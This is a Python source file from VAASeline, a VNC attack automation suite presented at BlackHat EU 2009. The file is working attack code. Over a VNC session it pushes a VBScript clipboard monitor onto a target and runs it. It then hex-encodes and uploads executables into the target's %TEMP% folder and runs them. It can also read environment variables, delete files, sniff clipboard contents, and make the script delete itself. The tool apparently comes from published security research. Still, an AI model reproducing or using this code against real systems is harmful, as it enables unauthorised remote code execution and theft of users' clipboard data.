## VAASeline - VNC Attack Automation Suite
##
## A module to ease the use of RPC/RFB technique for automating control of VNC systems.
## Presented at BlackHat EU 2009 by Rich Smith
##
## Check for the latest version at http://www.immunityinc.com/resources-freesoftware.shtml
"""
   Copyright (C) 2009 Rich Smith (rich@immunityinc.com)

   This library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 3 of the License, or (at your option) any later version.

   This library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.

   You should have received a copy of the GNU Lesser General
   Public License along with this library; if not, write to the
   Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,
   Boston, MA 02110-1301 USA
"""

## The main RPC-RFB technique class
from VAASeline import *
##For hex encoding
import cStringIO, binascii
##For sniffing
import thread

DEBUG = False
def debug(msg):
    if DEBUG:
        print msg

class ApplyVAASeline(VAASeline):
    
    """
    A class to provide some higher level functions using the primitives provided by the VAASeline class
    
    This class specifically correlates to the cb_mon.vbs clipboard monitor script
    """
    def __init__(self, host, port, cb_script="cb_mon.vbs"):
        
        VAASeline.__init__(self, host, port)
        
        ##The clipboard monitor vbs script to send - the opcodes should correspond between the methods below and the script
        self.cb_script = cb_script
        
        self.stop_sniffing_magic = "\x04\x04\x03\x03"
        
        
    def go(self, target_vbs_name="%TEMP%\\cb_mon.vbs"):
        """
        Little wrapper method to start off the whole VAASeline process
        
        Sends the specified cb monitor VBScript to the target and starts it
        
        If no target_vbs_name is specified then the vbs script is placed in the default location of: %TEMP%/cb_mon.vbs
        
        """
        try:
            fd=open(self.cb_script,"r")
            cb_mon=fd.read()
            fd.close()
        except Exception, err:
            debug("Problem reading the vbs script; %s"%(err))
            return 0
        
        ##Initialise VAASeline
        if type(self.start() ) == type(None):
            debug("Problem establishing VNC connection")
            return 0
        
        ##Send the script to the target
        debug( "*Sending vbscript.....")
        self.rfb_send_vbs( cb_mon, filename=target_vbs_name)
        
        ##Run it
        debug( "*Running vbscript.....")
        self.rfb_run_vbs(target_vbs_name)
        
        ##Get location of %TEMP% as we use this a fair amount
        self.temp_env = self.get_env_var("TEMP")
        debug( "%%TEMP%% = %s"%(self.temp_env) )
        
        return 1
        
        
    def upload_and_execute(self, l_exe, t_exe):
        """
        Wrapper around opcode methods below
        
        Uploads the local executable l_exe to location %TEMP%\t_exe on the target and then executes it
        """
        debug( "uploading executable; %s"%(l_exe) )
        #ret = self.upload_exe(l_exe, "%s\\%s"%(self.temp_env, t_exe))
        ret = self.chunked_upload(l_exe, "%s\\%s"%(self.temp_env, t_exe))

        if ret != -1:
            debug( "running %s\\%s"%(self.temp_env, t_exe) )
            self.run_exe("%s\\%s"%(self.temp_env, t_exe))
            return 1
        else:
            debug( "Problem with upload.")
            return None
        
    
    ##Methods below implement the opcodes for the particular clipboard monitor used
    def echo(self, string):
        """
        The target just echo's back what we send
        
        Opcode = 1
        Command = string to echo
        """
        return self.send_pdu(ord("1"), string)
    
        
    def run_exe(self, name, args=None):
        """
        Run an executable on the remote system
        
        Run opcode = 2
        Command = command to execute
        """
        if not args:
            return self.send_pdu(ord("2"), name)
        else:
            return self.send_pdu(ord("2"), name, args)
        
    
    def chunked_upload(self, exe_path, exe_name, size=1000000):
        """
        Split a hex encoded executable stream into chunks of size 'size'
        and concatonate at the far end
        """
        #RESET !!!!!!!!!!
        debug("encoding exe")
        hex_exe=self._hex_encode(exe_path)
        debug("done. Size = %d"%(len(hex_exe.getvalue())))
        
        ##Send chunks of the hex encoded binary size big (default 5000)
        hex_exe.seek(0)
        while 1:
            ##Read a chunk
            chunk = hex_exe.read(size)
            print chunk, len(chunk), type(chunk), hex_exe.tell()
            
            
            ##Is this the last chunk ?
            if len(chunk) <= 0:
                print "EOF"
                ret = self.send_pdu(ord("4"), "", exe_name)
                break
            
            ##Send it
            ret = self.send_pdu(ord("4"), chunk, exe_name)
            print "Sent chunk"
            
        hex_exe.close()
        
    
    def upload_exe(self, exe_path, exe_name):
        """
        Upload a file
        
        Run opcode = 4
        Command    = hex encoded binary
        Arg        = path to unhex executable to on the target
        """
        debug("encoding exe")
        hex_exe=self._hex_encode(exe_path)
        debug("done")
        
        if hex_exe:
            ret = self.send_pdu(ord("4"), hex_exe.getvalue(), exe_name)
            hex_exe.close()
            return ret
        else:
            debug("Problem encoding exes")
            return -1
            
        
        
    def _hex_encode(self, exe_path):
        """
        Take an executable pathname and encode it up in a hex encoded way
        """                
        try:
            binfile=open(exe_path, 'r')
        except Exception, err:
            debug( "problem opening/reading file: %s '%s'"%(exe_path,err))
            return None
            
        try:
            hexfile=cStringIO.StringIO()
        except:
            debug( "problem opening/writing file %s.hex"%(exe_path) )
            return None
            
        while 1:
            line_to_hex=binfile.readline()
            
            ##EOF ?
            if not line_to_hex:
                break
                
            ##Convert
            try:
                hexfile.write(binascii.hexlify(line_to_hex))
            except Exception, err:
                debug( "failure in hexifiing file - maybe not a binary? %s"%(err) )
                return None
            
        binfile.close()
        return hexfile
    
    
    def get_env_var(self, var):
        """
        Get an environment variable from the target - useful for %TEMP% etc
        
        Get Env Opcode = 5
        Command = variable to get
        """
        ##Make sure variable is in format %VAR_NAME%
        if var[0] != "%":
            var = "%"+var
            
        if var[-1] != "%":
            var = var+"%"
            
        return self.send_pdu(ord("5"), var)
    
    
    def del_file(self, file_to_del):
        """
        Delete a file on the target
        
        Delete opcode = 6
        Command       = file to delete
        """
        return self.send_pdu(ord("6"),file_to_del)
        
    
    def start_sniffer(self):
        """
        Kick off the sniffer on the target and 
        
        Sniff opcode = 7
        Command = 1 (ON)
        """
        ret=self.send_pdu(ord("7"), "1")
        
        if not ret:
            debug( "Sniffing did not start :(")
            return 0
        
        self.keep_sniffing = True
        
        try:
            self._sniffer()
        except KeyboardInterrupt:
            debug( "Ctrl-C caught, stopping sniffer")
            self.stop_sniffer()
        
    def _sniffer(self):
        """
        """
        ##Now we loop grabbing the data until we are told to stop - the caller of this function needs to wrap 
        ## its call so this loop can be stopped by setting self.keep_sniffing to False.
        while self.keep_sniffing:
            
            lock.acquire()
            ret=self.mark_q.get()
            
            

            ##And parse it
            status=self.parse_pdu(ret)

            self.mark_q.task_done()
            lock.release()
            

            debug( "Clipboard sniffed data: %s"%(status))
            
    def stop_sniffer(self):
        """
        Stop the sniffer on the target and 
        
        Sniff opcode = 7
        Command = 0 (OFF)        
        """
        self.keep_sniffing = False        
        
        ##Send the stop packet - this causes the vbs to send back the stop sniffing magic
        ret = self.send_pdu(ord("7"), "0")
        return ret
        
        
    def quit(self):
        """
        Tell the clipboard monitor to stop and to delete itself
        
        Quit opcode = 9
        Command = can be anything, not used
        """
        ret = self.send_pdu(ord("9"),"quit")
        self.sock.close()
        return ret
        